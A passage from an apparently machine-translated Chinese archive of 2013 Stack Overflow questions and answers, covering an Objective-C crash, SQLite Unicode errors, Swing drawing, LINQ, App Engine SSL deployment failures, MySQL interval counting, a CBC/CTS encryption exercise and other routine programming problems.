0x10e60ae:  je     0x10e60b9                 ; objc_msgSend + 45
0x10e60b0:  cmpl   (%eax), %ecx
0x10e60b2:  je     0x10e60d0                 ; objc_msgSend + 68
0x10e60b4:  addl   $1, %edx
0x10e60b7:  jmp    0x10e60a6                 ; objc_msgSend + 26
0x10e60b9:  popl   %esi
0x10e60ba:  popl   %edi
0x10e60bb:  movl   4(%esp), %edx
0x10e60bf:  movl   (%edx), %eax
0x10e60c1:  jmp    0x10e60d9                 ; objc_msgSend + 77
0x10e60c3:  nopw   %cs:(%eax,%eax)
0x10e60d0:  movl   8(%eax), %eax
0x10e60d3:  popl   %esi
0x10e60d4:  popl   %edi
0x10e60d5:  xorl   %edx, %edx
0x10e60d7:  jmpl   *%eax
0x10e60d9:  pushl  %eax
0x10e60da:  pushl  %ecx
0x10e60db:  pushl  %edx
0x10e60dc:  calll  0x10d3df3                 ; _class_lookupMethodAndLoadCache3
0x10e60e1:  addl   $12, %esp
0x10e60e4:  xorl   %edx, %edx
0x10e60e6:  jmpl   *%eax
0x10e60e8:  calll  0x10e60ed                 ; objc_msgSend + 97
0x10e60ed:  popl   %edx
0x10e60ee:  movl   1007235(%edx), %eax
0x10e60f4:  testl  %eax, %eax
0x10e60f6:  je     0x10e60fe                 ; objc_msgSend + 114
0x10e60f8:  movl   %eax, 4(%esp)
0x10e60fc:  jmp    0x10e6098                 ; objc_msgSend + 12
0x10e60fe:  movl   $0, %edx
0x10e6103:  ret 
```

将此突出显示为断点：

```
0x10e60b2:  je     0x10e60d0                 ; objc_msgSend + 68 
```

这作为输出：

```
(lldb) 
```

我真的没有第一个线索为什么它停止工作，它似乎工作了一分钟然后它停止了，但我也尝试将其清理干净并重置模拟器，但没有这样做..任何帮助都会非常感谢！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-26T23:18:22.487

乍看上去。

```
SieveArray = [NSMutableArray array];
PrimesAndThreads = [NSMutableArray array]; 
```

应该

```
SieveArray = [[NSMutableArray alloc]init];
PrimesAndThreads = [[NSMutableArray alloc]init]; 
```

# sqlite - SQLite 中的 UnicodeDecodeError

> ID：15650394
> 
> 赞同：0
> 
> 时间：2013-03-27T01:19:32.487
> 
> 标签：sqlite, unicode, python-unicode

我正在尝试获取 2 元素元组的列表并将它们添加到`SQLite`表中。

元组的第一个元素是一个字符串（编码为`unicode utf-8`），第二个元素是`murmurhash3 hash`该`utf-8`字符串的 a。

这是违规行：for result in

```
self.dbc.primaryCursor.executemany("insert into Table values(?,?); 
select last_insert_rowid() as lastrowid;", ListOfTermsAndHashesTuples) 
```

错误是`UnicodeDecodeError`：

```
'ascii' codec can't decode byte 0xc3 in position 4: ordinal not in range(128). 
```

是什么导致了这个错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:26:45.973

您的输入很可能不是有效的 UTF-8 格式。在 Linux 和 Mac 上，您可以通过将字符串放入文件并运行来轻松检查它：

```
iconv -f UTF-8 -t UTF-8 <your_filename_goes_here> 
```

# android - Facebook 3.0：在 android 上验证用户时我不明白的事情

> ID：15650395
> 
> 赞同：0
> 
> 时间：2013-03-27T01:19:32.723
> 
> 标签：android, facebook, permissions, authorization

我发现 facebook 3.0 有点奇怪。

如果没有在 android 上安装 facebook 应用程序，我可以使用 openForPublish，它会询问我基本权限，然后发布流权限。如果使用 openForRead 然后在回调函数中使用 newPermissionsRequest 获得发布流权限，我最终会登录两次。

另一方面，安装了 facebook 应用程序后，我无法在安装期间使用 openForPublish，因为它需要读取权限。如果使用 openForRead，然后将 newPermissionsRequest 用于发布流，我将能够请求发布流，但不会调用我传递给 newPermissionsRequest 的回调。

有没有人有同样的问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T16:05:42.157

正确的事件顺序是先调用 openToRead，然后再调用 requestNewPublishPermissions。这非常适合当前的权限请求模型。

对于网页对话框的情况，请升级到3.0.1，它解决了多次登录问题。

# .net - “变量”.Bounds.IntersectsWith

> ID：15650397
> 
> 赞同：-2
> 
> 时间：2013-03-27T01:19:46.193
> 
> 标签：.net, vb.net, visual-studio-2010, collision-detection, bounds

如何使我的代码中的 do while 循环与 z 作为变量一起工作？

```
Function make(ByVal z As Object)
    z.Location = zloc
    z.Hide()
    zloc = New Point(RandomNumber(playspace.Width), RandomNumber(playspace.Height))
    If zloc.Y > 595 Then
        zloc = New Point(RandomNumber(playspace.Width), RandomNumber(playspace.Height))
    End If
    z.location = zloc
    Do While z.bounds.intersectswith(PictureBox1.Bounds, PictureBox2.Bounds, PictureBox3.Bounds)
        zloc = New Point(RandomNumber(playspace.Width), RandomNumber(playspace.Height))
        z.location = zloc
    Loop
    z.Location = zloc
    z.Show()
    Return (z)
End Function 
```

问题是我不能在变量上使用“.bounds.intersectswith”。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:33:40.520

您的问题实际上来自`z`声明为`Object`. `Object`本身没有任何属性（嗯，只有真正的基本属性）。它当然没有`bounds`属性或方法，所以你不能使用它。

您需要做的是声明`z`它的实际类型（无论您的代码中是什么），您将能够访问它的属性。否则，如果您确实需要在方法中使用`Object`as 参数，则应在方法中`z`转换为正确的类型，使用`CType(z, TypeOfZ)`.

从您的代码中，我假设这`z`是某种边界框？无论如何，您应该将其声明为方法中的内容，例如

```
Function make(ByVal z As BoundingBox)
    ...
    If z.Bounds.IntersetcsWith(...) then
        ...
    End If
    ...
End Function 
```

# ios - 使 UITableViewCell 表现得像一个真正的按钮

> ID：15650398
> 
> 赞同：0
> 
> 时间：2013-03-27T01:19:57.723
> 
> 标签：ios, objective-c, cocoa-touch, cocoa, uikit

我想让`UITableViewCell`行为像真正的按钮。

直到知道我一直在使用

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath` 
```

技巧，但这不是最佳选择，因为它的行为不像`button`点击/拖动/释放。

如果您点击一个单元格行并将手指拖到该单元格上，当您松开手指时它不会被选中（但按钮会在相同情况下启动其操作）。

有没有什么简单的方法可以让 a`UITableViewCell`表现得像一个真正的按钮，而不需要在`UIButton`里面插入一个实际的按钮`cell`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:33:13.387

您可以创建带有按钮的表格视图单元格，将按钮标签设置为行，以便在收到按钮事件时锻炼按钮所属的行。只需确保在返回重复使用的表格视图单元格而不是创建新单元格时重置按钮标签。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T01:23:00.903

子类化 UITableViewCell 并使用以下方法：

```
- (void)setHighlighted:(BOOL)highlighted animated:(BOOL)animated {
  [super setHighlighted:highlighted animated:animated];
  if (highlighted) {
    _backgroundImageView.image = [UIImage imageNamed:@"img_h"];
  }
  else {
    _backgroundImageView.image = [UIImage imageNamed:@"img"];
  }
} 
```

其中 img 是普通图像，而 img_h 是该图像的突出显示版本。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T07:27:54.640

一种方法是创建一个单元格大小的 UIButton 并将其添加到单元格中。

或者你可以简单地添加一个`UITapGestureRecognizer`你的`UITableViewCell`，这将为你完成工作。

# ruby - 在按名称接受块的方法调用中包装块

> ID：15650399
> 
> 赞同：5
> 
> 时间：2013-03-27T01:20:10.673
> 
> 标签：ruby, block

我有很多这样的方法：

```
with_this do
  with_that do
    and_in_this_context do
      yield
    end
  end
end 
```

我记得有一个技巧可以递归地包装这样的块调用。如何编写一个为我执行块包装的方法？

```
def in_nested_contexts(&blk)
  contexts = [:with_this, :with_that, :and_in_this_context]
  # ... magic probably involving inject
end 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T02:28:49.640

您确实可以使用`inject`创建的嵌套 lambdas 或 procs，您可以在最后调用它们。您需要给定的块是嵌套的内部，因此您反转数组并将该块用作初始值，然后将每个连续的函数包装在注入的结果周围：

```
def in_nested_contexts(&blk)
  [:with_this, :with_that, :and_in_this_context].reverse.inject(blk) {|block, symbol|
    ->{ send symbol, &block }
  }.call
end 
```

如果你`with_this`用 before 和 after 语句包装你的 , et al 方法`puts`，你可以看到这个：

```
in_nested_contexts { puts "hello, world" }
#=> 
  with_this start
  with_that start
  context start
  hello, world
  context end
  with_that end
  with_this end 
```

# java - 在框架中放置风扇

> ID：15650415
> 
> 赞同：2
> 
> 时间：2013-03-27T01:21:54.820
> 
> 标签：java, swing, jpanel, paintcomponent

```
import java.awt.*;
import javax.swing.JPanel;

public class FigurePanel extends JPanel {
  // Define constants
  public static final int LINE = 1;
  public static final int RECTANGLE = 2;
  public static final int ROUND_RECTANGLE = 3;
  public static final int OVAL = 4;
  public static final int ARC = 5;
  public static final int POLYGON = 6;

  private int type = 1;
  private boolean filled;

  /** Construct a default FigurePanel */
  public FigurePanel() {
  }

  /** Construct a FigurePanel with the specified type */
  public FigurePanel(int type) {
    this.type = type;
  }

  /** Construct a FigurePanel with the specified type and filled */
  public FigurePanel(int type, boolean filled) {
    this.type = type;
    this.filled = filled;
  }

  /** Draw a figure on the panel */
  public void paintComponent(Graphics g) {
    super.paintComponent(g);

    // Get the appropriate size for the figure
    int width = getSize().width;
    int height = getSize().height;

    switch (type) {
      case LINE: // Display two cross lines
        g.setColor(Color.BLACK);
        g.drawLine(10, 10, width - 10, height - 10);
        g.drawLine(width - 10, 10, 10, height - 10);
        break;
      case RECTANGLE: // Display a rectangle
        g.setColor(Color.BLUE);
        if (filled)
          g.fillRect((int)(0.1 * width), (int)(0.1 * height),
            (int)(0.8 * width), (int)(0.8 * height));
        else
          g.drawRect((int)(0.1 * width), (int)(0.1 * height),
            (int)(0.8 * width), (int)(0.8 * height));
        break;
      case ROUND_RECTANGLE: // Display a round-cornered rectangle
        g.setColor(Color.RED);
        if (filled)
          g.fillRoundRect((int)(0.1 * width), (int)(0.1 * height),
            (int)(0.8 * width), (int)(0.8 * height), 20, 20);
        else
          g.drawRoundRect((int)(0.1 * width), (int)(0.1 * height),
            (int)(0.8 * width), (int)(0.8 * height), 20, 20);
        break;
      case OVAL: // Display an oval
        g.setColor(Color.BLACK);
        if (filled)
          g.fillOval((int)(0.1 * width), (int)(0.1 * height),
            (int)(0.8 * width), (int)(0.8 * height));
        else
          g.drawOval((int)(0.1 * width), (int)(0.1 * height),
            (int)(0.8 * width), (int)(0.8 * height));
        break;
      case ARC: // Display an arc
        g.setColor(Color.BLACK);
        if (filled) {
          int xCenter = getWidth() / 2;
          int yCenter = getHeight() / 2;
          int radius =
            (int)(Math.min(getWidth(), getHeight()) * 0.4);

          int x = xCenter - radius;
          int y = yCenter - radius;

          g.fillArc(x, y, 2 * radius, 2 * radius, 0, 30);
          g.fillArc(x, y, 2 * radius, 2 * radius, 90, 30);
          g.fillArc(x, y, 2 * radius, 2 * radius, 180, 30);
          g.fillArc(x, y, 2 * radius, 2 * radius, 270, 30);
        }
        else {
          int xCenter = getWidth() / 2;
          int yCenter = getHeight() / 2;
          int radius =
            (int)(Math.min(getWidth(), getHeight()) * 0.4);

          int x = xCenter - radius;
          int y = yCenter - radius;

          g.drawArc(x, y, 2 * radius, 2 * radius, 0, 30);
          g.drawArc(x, y, 2 * radius, 2 * radius, 90, 30);
          g.drawArc(x, y, 2 * radius, 2 * radius, 180, 30);
          g.drawArc(x, y, 2 * radius, 2 * radius, 270, 30);
        };
        break;
      case POLYGON: // Display a polygon
        g.setColor(Color.BLACK);
        int xCenter = getWidth() / 2;
        int yCenter = getHeight() / 2;
        int radius =
          (int)(Math.min(getWidth(), getHeight()) * 0.4);

        // Create a Polygon object
        Polygon polygon = new Polygon();

        // Add points to the polygon
        polygon.addPoint(xCenter + radius, yCenter);
        polygon.addPoint((int)(xCenter + radius *
          Math.cos(2 * Math.PI / 6)), (int)(yCenter - radius *
          Math.sin(2 * Math.PI / 6)));
        polygon.addPoint((int)(xCenter + radius *
          Math.cos(2 * 2 * Math.PI / 6)), (int)(yCenter - radius *
          Math.sin(2 * 2 * Math.PI / 6)));
        polygon.addPoint((int)(xCenter + radius *
          Math.cos(3 * 2 * Math.PI / 6)), (int)(yCenter - radius *
          Math.sin(3 * 2 * Math.PI / 6)));
        polygon.addPoint((int)(xCenter + radius *
          Math.cos(4 * 2 * Math.PI / 6)), (int)(yCenter - radius *
          Math.sin(4 * 2 * Math.PI / 6)));
        polygon.addPoint((int)(xCenter + radius *
          Math.cos(5 * 2 * Math.PI / 6)), (int)(yCenter - radius *
          Math.sin(5 * 2 * Math.PI / 6)));

        // Draw the polygon
        if (filled)
          g.fillPolygon(polygon);
        else
          g.drawPolygon(polygon);
    }
  }

  /** Set a new figure type */
  public void setType(int type) {
    this.type = type;
   // repaint();
  }

  /** Return figure type */
  public int getType() {
    return type;
  }

  /** Set a new filled property */
  public void setFilled(boolean filled) {
    this.filled = filled;
    repaint();
  }

  /** Check if the figure is filled */
  public boolean isFilled() {
    return filled;
  }

  /** Specify preferred size */
  public Dimension getPreferredSize() {
    return new Dimension(80, 80);
  }
} 
```

^ 即图形面板类

```
import java.awt.*;
import javax.swing.*;

public class fan extends JFrame {
  public static void main(String[] args) {
    JFrame frame = new fan();
    frame.setSize(300, 300);
    frame.setTitle("Exercise13_09");
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    frame.setLocationRelativeTo(null); // Center the frame
    frame.setVisible(true);
  }

  public fan() {
    setLayout(new GridLayout(2, 2));
    add(new FigurePanel(FigurePanel.ARC, true));
    add(new FigurePanel(FigurePanel.OVAL));
    add(new FigurePanel(FigurePanel.ARC, true));
    add(new FigurePanel(FigurePanel.OVAL, true));
  }
} 
```

这是粉丝课

我目前正在尝试制作一张风扇的照片以显示在屏幕上，并且想知道是否有办法让它在同一个位置绘制弧线和椭圆形？我一直在搞乱图形面板类，但我不太确定如何将 ARC true 与 OVAL 合并。帮助将不胜感激谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:49:24.593

在分支`drawOval()`的末尾添加：`fill``case ARC`

```
g.drawOval(x, y, 2 * radius, 2 * radius); 
```

还要考虑`RenderingHints`：

```
Graphics2D g2d = (Graphics2D) g;
g2d.setRenderingHint(
    RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON); 
```

# linq - 另一个我如何使用 LINQ 枚举字典

> ID：15650416
> 
> 赞同：1
> 
> 时间：2013-03-27T01:22:01.937
> 
> 标签：linq

感谢所有回答我最后一个问题并做出贡献的人。我遇到了另一个有趣的 LINQ 问题的化身......就像以前一样......

我有以下

```
const String A_CONVERSATION = "AD Channels";
const String NOT_REPUTABLE = "AD Resolution";
const String DO_NOT_KNOW = "Capture Input";

private enum Properties
{ MyHow, Thats, It }

List<String> MyList = new List<string> 
{ 
    A_CONVERSATION, 
    NOT_REPUTABLE, 
    DO_NOT_KNOW
}

private Dictionary <Properties, String> PropertyToString;
private Dictionary <String, Properies> StringToProperty; 
```

如何使用 LINQ 填充每个字典，以便可以使用以下内容？是否有一行 LINQ 语句可以填充每个语句？

```
Properties MyResult1 = StringToProperty[A_CONVERSATION];
String MySResult2 = PropertyToString[Properties.It]; 
```

我特别想在第二种情况下使用 actaull 属性来索引。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:35:07.707

提供这是你想要的......

在两个语句中（我猜一个可以通过某种查找以某种方式合并 - 但我认为这不是那么相关 - 并非所有内容都必须在一行中:)

```
var properties = ((Properties[])Enum.GetValues(typeof(Properties))).ToList();
var propertyToString = properties.Zip(MyList, (p, s) => new { Prop = p, Text = s }).ToDictionary(x => x.Prop, x => x.Text);
var stringToProperty = properties.Zip(MyList, (p, s) => new { Prop = p, Text = s }).ToDictionary(x => x.Text, x => x.Prop); 
```

我故意将枚举列表的构成分开 - 为清楚起见 - 如果你愿意，你可以将它移到一行中。

# google-app-engine - Datastore 为什么使用 key 和 id？

> ID：15650422
> 
> 赞同：0
> 
> 时间：2013-03-27T01:22:44.517
> 
> 标签：google-app-engine, google-cloud-datastore

我有一个关于为什么 Google App Engine 的数据存储区使用密钥和 ID 的问题。来自关系数据库背景，我正在将实体与行进行比较，那么为什么在存储实体时需要一个键（这是一个自动生成的长字符串）和一个 ID（可以手动或自动输入）？这似乎是对识别记录的巨大空间浪费。我再次对这种类型的数据库不熟悉，所以我可能会遗漏一些东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T14:46:56.710

Key design is a critical part of efficient Datastore operations. The keys are what are stored in the built-in and custom indexes and when you are querying, you can ask to have only keys returned (in Python: `keys_only=True`). A keys-only query costs a fraction of a regular query, both in $$ and to a lesser extent in time, and has very low deserialization overhead.

So, if you have useful/interesting things stored in your key id's, you can perform keys-only queries and get back lots of useful data in a hurry and very cheaply.

Note that this extends into parent keys and namespaces, which are all part of the key and therefore additional places you can "store" useful data and retrieve all of it with keys-only queries.

It's an important optimization to understand and a big part of our overall design.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T04:31:31.620

基本上，密钥是由两条信息构成的：

*   实体类型（在Objectify中是对象的类）
*   实体的 ID/名称

因此，对于给定的实体类型，key 和 id 完全相同。

如果您自己不指定 ID，则会生成一个随机 ID，并根据该随机 ID 创建密钥。

# mysql - 计算间隔之间的行数

> ID：15650423
> 
> 赞同：0
> 
> 时间：2013-03-27T01:22:49.750
> 
> 标签：mysql

我的桌子是这样的：

```
+---------+---------+------------+-----------------------+---------------------+
| visitId | userId  | locationId | comments              | time                |
+---------+---------+------------+-----------------------+---------------------+
|       1 |    3    |     12     | It's a good day here! | 2012-12-12 11:50:12 |
+---------+---------+------------+-----------------------+---------------------+
|       2 |    3    |     23     | very beautiful        | 2012-12-12 12:50:12 |
+---------+---------+------------+-----------------------+---------------------+
|       3 |    3    |     52     | nice                  | 2012-12-12 13:50:12 |
+---------+---------+------------+-----------------------+---------------------+ 
```

其中记录**了访问者的轨迹和对访问过的地方的一些评论**。

我想计算从 0:00 到 23:59 在某个时间间隔（即 30 分钟）内访问特定地点（比如 id=3227）的访客数量

**我试图通过以下方式做到这一点**：

```
SELECT COUNT(*) FROM visits 
GROUP BY HOUR(time), SIGN( MINUTE(time) - 30 )// if they are in the same interval this will yield the same result
WHERE locationId=3227 
```

**问题是，**如果在某个时间间隔内没有记录，这将不会返回计数为 0 的时间间隔。例如，从 02:00 到 03:00 没有访客访问该位置，这不会给我时间间隔为 02:00-02:29 和 02:30-2:59。

**我想要一个精确大小为 48 的结果**（每半小时一个），我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:38:47.300

您必须创建一个包含 48 行的表并使用左外连接：

```
select n.hr, n.hr, coalesce(v.cnt, 0) as cnt
from (select 0 as hr, -1 as sign union all
      select 0, 1 union all
      select 1, -1 union all
      select 1, 1 union all
      . . .
      select 23, -1 union all
      select 23, 1 union all
     ) left outer join
     (SELECT HOUR(time) as hr, SIGN( MINUTE(time) - 30 ) as sign, COUNT(*) as cnt
      FROM visits 
      WHERE locationId=3227
      GROUP BY HOUR(time), SIGN( MINUTE(time) - 30 )
     ) v
     on n.hr = v.hr and n.sign = v.sign
order by n.hr, n.hr 
```

# css - 特定类别中的 Magento 造型产品

> ID：15650425
> 
> 赞同：0
> 
> 时间：2013-03-27T01:22:58.123
> 
> 标签：css, magento

在 Magento 中，我如何能够以不同的方式对待特定类别的产品？

可以说，我有一个类别“特价商品”，我希望对其产品的展示与目录中的其他产品有所不同。

我最初考虑将自定义样式与附加到 BODY 元素的类别类名称挂钩。然而，这似乎不是万无一失的，因为如果您直接访问这些产品，它们并不总是显示在该类别中（假设 cookie 或会话对此有发言权）并且自定义样式被忽略。

另外虽然关于将自定义布局模板分配给该类别，但我将它们用作布局而不是样式，我不想混淆用途以避免将来出现问题。

以前有人有这个顾虑吗？谢谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T08:41:26.813

您有 2 个面向代码的解决方案：

*   如果“类别”的概念是您通过类别访问产品（在您的产品页面上，面包屑显示类别），您将能够（在您的目录/产品/视图中的某个位置）访问产品。 phtml）`Mage::registry('current_category')`其中包含您的 current_category 并将其与您的“特定类别”（可以存储为配置变量）进行比较

*   否则，如果您想在不通过类别导航访问产品时应用您的样式，则必须手动检查您的产品类别 ( `$product->getCategoryIds()`) 并将其与您的“特定类别”（可以存储为配置变量）

ps：请记住，一个产品可以分配到多个类别

啤酒花这对你有帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-28T09:41:53.517

如果您有特殊的特定类别，那么为 Only Special 类别创建新主题并将该主题从后端分配给特殊类别，您可以从管理员的类别管理页面轻松地将不同的主题分配给不同的类别。

或者您也可以从管理产品页面为产品分配不同的主题。

# google-app-engine - Google App Engine 上的 SSL 证书

> ID：15650428
> 
> 赞同：3
> 
> 时间：2013-03-27T01:23:33.767
> 
> 标签：google-app-engine, python-2.7

我在开始使用 GAE（OS X 10.6.8 和 Python 2.7 上的 1.7.6）时遇到问题，与亚马逊服务相比，它非常糟糕。但是，我想至少部署示例应用程序。在解决了其他问题之后，我现在准备好部署一个小型示例应用程序。当我尝试部署它时，我收到如下 SSL 错误：

```
 *** Running appcfg.py with the following flags:
    --no_cookies --email=mathsboy@gmail.com --passin update
02:15 PM Host: appengine.google.com
02:15 PM Application: tew-helloworld; version: 1
Traceback (most recent call last):
  File "google_appengine/appcfg.py", line 171, in <module>
    run_file(__file__, globals())
  File "google_appengine/appcfg.py", line 167, in run_file
    execfile(script_path, globals_)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/appcfg.py", line 4155, in <module>
    main(sys.argv)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/appcfg.py", line 4146, in main
    result = AppCfgApp(argv).Run()
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/appcfg.py", line 2334, in Run
    self.action(self)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/appcfg.py", line 3881, in __call__
    return method()
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/appcfg.py", line 2892, in Update
    updatecheck.CheckForUpdates()
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/sdk_update_checker.py", line 258, in CheckForUpdates
    runtime=runtime))
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/appengine_rpc.py", line 393, in Send
    f = self.opener.open(req)
  File "/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py", line 394, in open
    response = self._open(req, data)
  File "/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py", line 412, in _open
    '_open', req)
  File "/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py", line 372, in _call_chain
    result = func(*args)
  File "/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py", line 1207, in https_open
    return self.do_open(httplib.HTTPSConnection, req)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/lib/fancy_urllib/fancy_urllib/__init__.py", line 383, in do_open
    url_error.reason.args[1])
fancy_urllib.InvalidCertificateException: Host appengine.google.com returned an invalid certificate (_ssl.c:503: error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed): 
To learn more, see http://code.google.com/appengine/kb/general.html#rpcssl
If deploy fails you might need to 'rollback' manually.
The "Make Symlinks..." menu option can help with command-line work.
*** appcfg.py has finished with exit code 1 *** 
```

在另一个线程中对此有一些建议，指出您需要删除 cacerts.txt，尽管我无法在 OS X 上找到此文件。此外，为了上传代码，我必须删除一个 cacert 文本文件。但也许我是个白痴。

我在这里面临的另一个问题是，由于管理 python 版本的困难，OS X 不能很好地与 GAE 一起工作。在安装了多个版本的 python、EPD、ActiveState、MacPorts 之后，我现在手头一团糟。尽管有保证，但这些都不能解决我早期的问题。这真是谷歌应用管理的状态，实在是太骇人听闻了。看起来 GAE 似乎是由一群来自 90 年代中期微软的人构建的......任何关于上述问题的建议将不胜感激。干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T08:38:18.770

错误中的第四行。链接下的相关说明。

`http://code.google.com/appengine/kb/general.html#rpcssl`

确保（来自文档）：

`To do this you must have the ssl Python module installed on your system.`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-13T06:31:08.250

**解决方法**`--skip_sdk_update_check=yes`：运行时使用命令行参数`dev_appserver.py`。

* * *

我遇到了同样的问题，并注意到`--skip_sdk_update_check=yes`每次启动应用程序时都会使用 GUI 工具 (GoogleAppEngineLauncher)。这是从 SDK 1.8.7 开始的。

根本原因似乎是GAE 开发服务器的模块白名单系统中的一个[已知错误。](https://code.google.com/p/googleappengine/issues/detail?id=9218)即使您安装了`ssl`模块（如文档所述是必需的），也`ssl`依赖于`_ssl`未列入白名单的模块。这就是为什么您可以`import ssl`毫无问题地在常规 python shell 会话中执行，但在 GAE 应用程序中执行同一行时会出错。

# php - CakePHP2.x 是否有任何 CSV 数据源插件

> ID：15650430
> 
> 赞同：0
> 
> 时间：2013-03-27T01:23:38.680
> 
> 标签：php, cakephp, plugins, datasource, cakephp-2.3

Cake 1.3[有一个 CSV 源](https://github.com/cakephp/datasources/blob/master/models/datasources/csv_source.php)，但我没有使用 csv 找到任何源。

有谁知道吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T05:50:42.247

只需切换到`2.0`存储库的分支：[https ://github.com/cakephp/datasources/blob/2.0/Model/Datasource/CsvSource.php](https://github.com/cakephp/datasources/blob/2.0/Model/Datasource/CsvSource.php)

# java - 密码块链接/密文窃取 java

> ID：15650432
> 
> 赞同：2
> 
> 时间：2013-03-27T01:23:56.207
> 
> 标签：java, encryption, cryptography, aes

为了更好地理解 CBC 和 CTS，我试图实现我自己的类，该类可以在不使用 java 内置的 CTS 模式的情况下进行加密和解密。我使用 AES 包装类作为底层算法，但使用 CTS 作为操作模式。到目前为止，我一直在研究加密方法，但不确定从那里去哪里。我不太确定如何在 CTS 模式结束时实现块交换。

这是迄今为止我的加密方法的代码（不用担心它 100% 工作的 AES 类）：

```
 static byte[] encrypt(byte[] ptBytes, javax.crypto.SecretKey key, byte[] IV){

    byte [] ct; 
    byte [] pt;
    byte [] ptBlock, ctBlock;

    //pad the array to proper length
    pt = Arrays.copyOf(ptBytes, (int) (Math.ceil( ( ptBytes.length )/16)*16) );

    //ctBlock = one block of cipher text
    ctBlock = new byte [16];

    //make ct the length of the padded pt 
    ct = new byte [pt.length];

    //do the encryption
    //i is for the current block of plain / cipher text we are on
    for( int i = 1; i < (int) ((Math.ceil( ( ptBytes.length )/16)+1)); i++){
        if( i == 1 ){

            //make ptBlock the first block of the entire plain text
            ptBlock = Arrays.copyOfRange(pt, 0, (i*16)-1);

            //since i = 1 do the XOR to get new plain text with IV
            for (int j = 0; j < ptBlock.length - 1; j++){
                ptBlock[j] = (byte)(ptBlock[j] ^ IV[j]);
            }

            //now time to do the encryption between the current block of plain text and the key
            try {
                ctBlock = AES.encrypt(ptBlock, key);
            } catch (Exception e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

            //now put the cipher text block we just got into the final cipher text array
            for( int k = 0; k < ctBlock.length; k++){
                ct[k] = ctBlock[k];
            }

        }
        else{
            //make ptBlock the current number block of entire plain text
            ptBlock = Arrays.copyOfRange(pt, (i-1)*16, (i*16)-1);

            //now XOR the plain text block with the prior cipher text block
            for(int j = 0; j < ptBlock.length - 1; j++){
                ptBlock[i] = (byte) (ptBlock[j] ^ ctBlock[j]);
            }

            //now time to do the encryption between the current block of plain text and the key
            try {
                ctBlock = AES.encrypt(ptBlock, key);
            } catch (Exception e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

            //now put the cipher text block we just got into the final cipher text array
            for( int k = (i-1)*16; k < (i*16)-1; k++){
                ct[k] = ctBlock[k-16];
            }
        }
    }

    return ct;
} 
```

如果有人能对如何完成这种方法提供一些见解，那就太好了，因为我仍在学习 CBC/CTS 的来龙去脉

谢谢！

# mysql - 使用 JSP/servlet 将文件系统中的图片上传到 MYSQL

> ID：15650434
> 
> 赞同：0
> 
> 时间：2013-03-27T01:24:49.063
> 
> 标签：mysql, jsp

我在执行此任务时遇到了一些麻烦，我可以使用一些帮助：

我正在尝试使用 JSP/Java Servlet 将图片从我的文件系统上传到 MYSQL DB

我在图像文件夹中有一个文件。我知道我应该读取文件，将其转换为字节，获取 outputStream，但我没有那么幸运（而且我没有发布任何代码，因为我的尝试是火车残骸）。在文件位于 outputStream 中之后，我知道如何将 sql 语句形成为插入，并将 blob 引用为？参数，但我无法做到这一点。

任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T05:29:28.107

您需要遵循的步骤 1\. 在主视图中使用 input type="file" 标签。2.使用 DiskFileItemFactory 读取上传文件的所有字节 3.将文件保存在服务器的文件夹中 4.从该文件夹位置识别具有文件名的文件并将其存储到 MySql DB 中以供此使用 blob 5.不要直接从中选择文件您的本地系统并存储在数据库中，首先您必须将其上传到您的服务器然后执行DAO操作

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T05:39:20.740

公共类 UploadFilesServlet 扩展 HttpServlet {

```
public void doPost(HttpServletRequest req,HttpServletResponse res) throws ServletException,IOException
{
